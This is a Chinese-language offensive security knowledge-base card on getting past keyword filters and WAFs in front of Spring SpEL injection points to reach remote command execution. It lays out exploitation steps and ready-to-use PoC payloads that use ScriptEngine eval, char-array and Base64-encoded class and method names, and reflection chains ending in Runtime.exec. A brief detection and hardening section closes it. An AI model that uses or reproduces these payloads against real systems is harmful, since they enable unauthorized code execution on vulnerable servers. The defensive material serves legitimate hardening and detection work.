---
id: web-java-expression-spel-waf-bypass-scriptengine-reflection
title: SpEL 关键字与字符过滤绕过：ScriptEngine 内联、字符数组、Base64 与反射
type: scenario
domain: web
path: web/java/expression/spel
technique: spel-filter-bypass-scriptengine-reflection
tags:
- spel
- bypass
- waf
- scriptengine
- reflection
- java
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:09:41+08:00'
  notes: 原文无图片，已核对各绕过思路。核对时修正卡内三处不成立/不严谨的 PoC：ScriptEngine 字符串拼接改为 Class.forName(x).getMethod('getRuntime').invoke(null).exec('id')（原直接调 Class.getRuntime 不存在）；反射 getMethod 去掉错误类型的 new String[]{} 第二参；getMethods()[0] 改为需先枚举索引的说明。Base64+ScriptEngine 与字符数组链成立；JDK 15+ 无 Nashorn 的边界已注明。confidence=medium 合理。原文未涉及版本区间。未执行 PoC。
url: /docs/web/java/expression/spel/web-java-expression-spel-waf-bypass-scriptengine-reflection/
draft: false
kb_aliases:
- SpEL 绕过 WAF
- SpEL 过滤 exec/Runtime
- ScriptEngineManager 绕过
- 字符数组构造类名
- SpEL 反射 invoke 绕过
---

## 一句话结论

当 SpEL 注入点只做字符串黑名单（如拦截 `Runtime`、`exec`、`.`、引号）时，可以通过 `ScriptEngineManager` 把执行转移到 JavaScript/Groovy 引擎、用字符数组或 Base64 在运行时还原类名/方法名、用 `Class.forName().getMethod().invoke()` 反射调用，绕过静态关键字匹配后仍然执行命令。

## 原理

- 黑名单通常在请求字符串层面匹配 `Runtime`、`exec`、`ProcessBuilder`、`.` 等字面量；SpEL 本身允许字符串拼接、字符数组、方法调用和嵌套表达式，因此可以在求值阶段才把敏感字符串拼出来。
- `new javax.script.ScriptEngineManager().getEngineByName('js')` 在 JDK 8（Nashorn）中可用；把命令执行代码作为 JavaScript 字符串交给 `eval`，由另一个解释器解析，SpEL 层只看到 `ScriptEngineManager`/`eval`，看不到 `Runtime` 字面量。JDK 15+ 移除了 Nashorn，除非应用额外引入 JavaScript 引擎或 Groovy/Jython，否则该路径不可用。
- 字符数组绕过：`new String(new char[]{82,117,110,116,105,109,101})` 在运行时拼出 `Runtime`；`T(java.lang.Character).toString(99)` 拼出单个字符。
- Base64 绕过：`T(java.util.Base64).getDecoder().decode('...')` 还原字符串或字节码，避免明文关键字。
- 反射绕过：`T(java.lang.Class).forName('java.lang.Run'+'time').getMethod('getRun'+'time').invoke(null)` 不出现完整类名/方法名；`getMethod(new String(new char[]{101,120,101,99}))` 可构造 `exec`。
- 点号过滤时可用中括号访问 Map/数组（`T(System).getenv()['PATH']`），或用 `getMethods()` 返回数组的索引；括号过滤时可用 ScriptEngine 内部语法（`obj['exe'+'c'](...)`）；引号过滤时用字符数组或 `Character.toString` 生成字符串。

## 触发条件

- 已确认存在 SpEL 求值点（见核心卡），但请求被 WAF/业务过滤器按关键字拦截。
- 目标 JDK/classpath 满足所选绕过路径：JDK 8 自带 Nashorn，或应用引入 Groovy/Jython；`javax.script` 可用。
- 过滤器只做静态字符串匹配，未做 SpEL AST 级校验，也未禁用 `ScriptEngineManager`、`Class.forName`、`getMethod`、`invoke`、`getClass` 等反射 API。
- 字符数组路径不依赖额外引擎；Base64 可用于还原类名/方法名，或还原 JS 源码（后者仍依赖 JS 引擎）。payload 更长，可能触发长度限制。

## 利用步骤

1. 先确认过滤粒度：分别提交 `T(java.lang.Runtime)`、`T(java.lang.System).currentTimeMillis()`、`T(java.lang.Math).PI`，观察是拦截类名、方法名、点号还是括号。
2. 若类名被拦，先用字符串拼接试探：`T(java.lang.Class).forName('java.lang.Run'+'time')`，返回 Class 即通过。
3. 若方法名被拦，用字符数组构造：`getMethod(new String(new char[]{101,120,101,99}))`。
4. 若引号被拦，用 `new String(new char[]{...})` 或 `T(java.lang.Character).toString(n)` 生成字符串。
5. 若 `Runtime`/`exec` 整体被拦且字符数组可用，用反射链组合出 `getRuntime().exec()`；若目标有 JS 引擎，可改用 ScriptEngine 内联。
6. 执行后用回显卡或外带卡取结果。

## PoC

ScriptEngine + 字符串拼接（JDK 8 Nashorn）：

```text
new javax.script.ScriptEngineManager().getEngineByName('js').eval("var x='java.lang.Run';x+='time';java.lang.Class.forName(x).getMethod('getRuntime').invoke(null).exec('id')")
```

ScriptEngine + 方法名字符串拼接：

```text
new javax.script.ScriptEngineManager().getEngineByName('js').eval("java.lang.Runtime.getRuntime()['exe'+'c']('id')")
```

字符数组还原类名：

```text
T(java.lang.Class).forName(new String(new char[]{106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101}))
```

字符数组还原方法名并反射调用：

```text
T(java.lang.Runtime).getRuntime().getClass().getMethod(new String(new char[]{101,120,101,99})).invoke(T(java.lang.Runtime).getRuntime(),'id')
```

Base64 还原字符串：

```text
new javax.script.ScriptEngineManager().getEngineByName('js').eval(new java.lang.String(java.util.Base64.getDecoder().decode('amF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoJ2lkJyk=')))
```

反射 + getMethods() 索引（点号被过滤时可避开 `.` 直连；但数组顺序随 JDK 实现变化，`[0]` 不保证是 `getRuntime`，需先枚举确认，不能固定照抄）：

```text
T(java.lang.Class).forName('java.lang.Runtime').getMethods()  // 返回 Method[]，需按目标 JDK 枚举出 getRuntime 的索引
```

## 变体与关联

- 变体：`Groovy`/`Jython` 引擎（`getEngineByName('groovy')`、`'python'`）在 classpath 存在时可用；语法与 JS 不同。
- 变体：`ProcessBuilder` 替代 `Runtime.exec`，避开 `exec` 关键字。
- 变体：用 `java.util.Base64`、`java.net.URLDecoder`、`StringBuilder` 等运行时还原字符串。
- 变体：点号被过滤时用 `getMethods()` 数组索引、Map 中括号访问；引号被过滤时用 `Character.toString`。
- 关联：[[web-java-expression-spel-injection-to-rce]]（基础注入与执行）。
- 关联：[[web-java-expression-spel-restricted-reflection-memshell]]（当 `T()`/`new` 被 AST 级限制时，改用 `''.getClass().forName(...)` 等反射链）。
- 注意：JDK 15+ 默认无 Nashorn，ScriptEngine 路径会失败；需要先在目标上确认引擎存在，不能假定所有 JDK 8 环境一定可用（部分裁剪版 JRE 也不带 Nashorn）。

## 检测与防御

- 修复：不要用字符串黑名单作为 SpEL 的唯一防线；改用 `SimpleEvaluationContext` 或自定义 `EvaluationContext`，禁用类型引用、构造器、方法调用和反射 API。
- 加固：禁止 `ScriptEngineManager`、`ScriptEngine#eval`、`Class#forName`、`getMethod/getDeclaredMethod`、`invoke`、`getClass` 等调用；对表达式做 AST 级白名单，而不是正则匹配。
- 加固：移除不必要的脚本引擎（Nashorn、Groovy、Jython）依赖，减少可利用面。
- 检测：请求中出现 `ScriptEngineManager`、`getEngineByName`、`eval(`、`new String(new char[]`、`Character.toString`、`getDecoder().decode`、`getMethods()`、`getDeclaredMethod`、`invoke(`、`forName(` 等组合；同一参数在短时间内出现多次探测性表达式。
- 检测：JVM 中出现脚本引擎初始化、异常 `ScriptException`、`SpelEvaluationException`，且请求体包含上述特征。
